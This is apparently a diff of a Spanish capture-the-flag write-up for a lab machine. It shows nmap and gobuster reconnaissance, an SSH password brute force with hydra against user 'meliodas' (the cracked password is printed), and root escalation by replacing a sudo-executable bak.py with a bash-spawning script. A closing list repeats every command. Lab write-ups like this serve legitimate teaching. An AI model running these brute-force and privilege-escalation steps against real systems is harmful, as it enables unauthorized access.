@@ -4,114 +4,148 @@
 
 ## Reconocimiento
 
-1. Empiezo con un scaneo completo: 
-2. `db_nmap -sV -sC -O -A -T4 -p- -Pn IP`
+Empiezo con un escaneo completo para ver puertos, servicios y versión del sistema:
+
+```bash
+db_nmap -sV -sC -O -A -T4 -p- -Pn IP
+```
 
 ![nmap](images/nmap.png)
 
 Descubro dos puertos abiertos:
 
-- 22/tcp (SSH)
-- 80/tcp (HTTP)
+- `22/tcp` (SSH)
+- `80/tcp` (HTTP)
 
 ![ports](images/ports.png)
 
-## Enumeracion
+## Enumeración
 
-1. Decido usar gobuster para enumerar directorios:
-2. `gobuster dir -u http://IP -w /usr/share/wordlists/dirb/common.txt`
+Decido usar `gobuster` para enumerar directorios:
+
+```bash
+gobuster dir -u http://IP -w /usr/share/wordlists/dirb/common.txt
+```
 
 ![gobuster](images/gobuster.png)
 
-Los unicos directorios abiertos son:
+Los únicos recursos interesantes que aparecen son:
 
-- robots.txt
-- index.html
+- `robots.txt`
+- `index.html`
 
-Cuando voy a robots.txt veo que pone:
+Cuando reviso `robots.txt`, veo esto:
 
-`user-agent: rockyou`
+```text
+User-agent: rockyou
+```
 
-Entiendo que me sugiere hacer fuerza-bruta con la lista de rockyou.
+Interpreto la pista como una sugerencia clara de fuerza bruta con la wordlist `rockyou`.
 
 ![robots](images/robots.png)
 
-Antes de hacer nada voy a mirar la otra ruta `index.html`
+Antes de lanzar nada, reviso también `index.html`.
 
-Encuentro que hay un usuario llamado `meliodas`, que es el que publica entradas, y luego en comentarios hay otros varios usuarios:
+Ahí encuentro que hay un usuario llamado `meliodas`, que es quien publica las entradas. En los comentarios aparecen además otros nombres como:
 
-`root, www-data y Anonymous`
+- `root`
+- `www-data`
+- `Anonymous`
 
 ![meliodas](images/meliodas.png)
 ![users](images/users.png)
 
 ## Explotación
 
-Pruebo fuerza bruta con hydra primero con el usuario `meliodas` y la lista de rockyou:
+Pruebo fuerza bruta por SSH con `hydra`, usando `meliodas` y `rockyou`:
 
-`hydra -l meliodas -P /usr/share/wordlists/rockyou.txt -t 4 -vV ssh://IP -f`
+```bash
+hydra -l meliodas -P /usr/share/wordlists/rockyou.txt -t 4 -vV ssh://IP -f
+```
 
-Encuentro la contraseña para este usuario: `iloveyou1`
+Encuentro la contraseña de ese usuario:
 
+```text
+iloveyou1
+```
 
 ![password](images/password.png)
 
-Nos conectamos a la máquina con las credenciales obtenidas.
+Con esas credenciales, me conecto por SSH a la máquina.
 
 ![login](images/login.png)
 
-Lo primero es ver que permisos tenemos:
-Probé con getuid, id, whoami, y por ultimo:
+Lo primero que hago es comprobar qué permisos tengo. Pruebo varios comandos, pero el que realmente me interesa aquí es:
 
-`sudo -l`
+```bash
+sudo -l
+```
 
 ![sudo](images/sudo.png)
-
 ![id](images/id.png)
 
-Solo tenemos permisos para ejecutar: python y el archivo bak.py 
-La shell inicial no es interactiva (sin TTY), lo que limitaba muchos comandos: no deja usar su, sudo, getuid...
+Veo que puedo ejecutar `python` y el archivo `bak.py` con privilegios elevados.
 
-Tras mirar el archivo bak.py veo que se ejecuta como root.
+Al revisar la situación, veo que `bak.py` se ejecuta como `root`, pero el archivo original pertenece también a `root`, así que no puedo editarlo directamente. Aun así, como el directorio es escribible para `meliodas`, sí puedo borrarlo y crear otro con el mismo nombre.
 
-El problema es que el archivo también pertenece a root, por lo que no podemos modificarlo. Pero podemos borrarlo y crear uno nuevo con el mismo nombre pero con una mejora para que abra como root una shell.
+Compruebo eso con:
 
-Comprobacion: `ls -ld /home/meliodas` esto nos muestra que podemos eliminar y crear archivos en el directorio donde estoy.
+```bash
+ls -ld /home/meliodas
+```
 
 ## Escalada de privilegios
 
-Borro el archivo original: `rm -f bak.py`
-Creo de nuevo el archivo: `touch bak.py`
+Borro el archivo original:
 
-Escribo el código en el archivo para poder ejecutar una shell como root: 
-Podemos usar tanto:
+```bash
+rm -f /home/meliodas/bak.py
+```
 
-`echo 'import pty; pty.spawn("/bin/bash")' > bak.py`
+Creo un nuevo `bak.py` que abra una shell como `root`. Por ejemplo:
 
-como:
+```bash
+echo 'import os; os.system("/bin/bash")' > /home/meliodas/bak.py
+```
 
-`echo 'import os; os.system("/bin/bash")' > bak.py`
+También valdría:
 
-Este código ejecuta una shell bash. Al ejecutarse mediante sudo, se lanza con privilegios de root.
+```bash
+echo 'import pty; pty.spawn("/bin/bash")' > /home/meliodas/bak.py
+```
 
-`sudo python /home/meliodas/bak.py`
+Después ejecuto el script con la ruta completa:
 
-Importante poner la ruta completa del archivo porque sino detecta la ruta de /usr/bin... y no te deja porque solo tienes permisos en tu directorio.
+```bash
+sudo python /home/meliodas/bak.py
+```
+
+Es importante usar la ruta completa del archivo, porque si no `sudo` intenta resolverlo desde otra ubicación y no funciona como espero.
 
 ![commands](images/commands.png)
-
 ![root](images/root.png)
 
-Ya disponemos de permisos de root.
-
+Con eso ya obtengo una shell con privilegios de `root`.
 
 ## Resultado
 
-### Resumen de vulnerabilidad:
+La vulnerabilidad aquí es una mala configuración de permisos:
 
-Esta vulnerabilidad se debe a una mala configuración de permisos:
+- El usuario puede ejecutar Python como `root` mediante `sudo`
+- El directorio es escribible, así que puede sustituir un script que luego se ejecuta con privilegios elevados
 
-- El usuario puede ejecutar Python como root mediante sudo
-- El directorio es escribible, permitiendo modificar scripts ejecutados con privilegios elevados
+Eso permite ejecutar código arbitrario como `root` de una forma bastante limpia.
 
-Esto permite ejecutar código arbitrario como root.
+## Resumen de comandos directo a SYSTEM/root
+
+1. `db_nmap -sV -sC -O -A -T4 -p- -Pn IP`
+2. `gobuster dir -u http://IP -w /usr/share/wordlists/dirb/common.txt`
+3. Identificar el usuario `meliodas` y la pista `rockyou`
+4. `hydra -l meliodas -P /usr/share/wordlists/rockyou.txt -t 4 -vV ssh://IP -f`
+5. `ssh meliodas@IP`
+6. `sudo -l`
+7. `ls -ld /home/meliodas`
+8. `rm -f /home/meliodas/bak.py`
+9. `echo 'import os; os.system("/bin/bash")' > /home/meliodas/bak.py`
+10. `sudo python /home/meliodas/bak.py`
+11. `whoami`
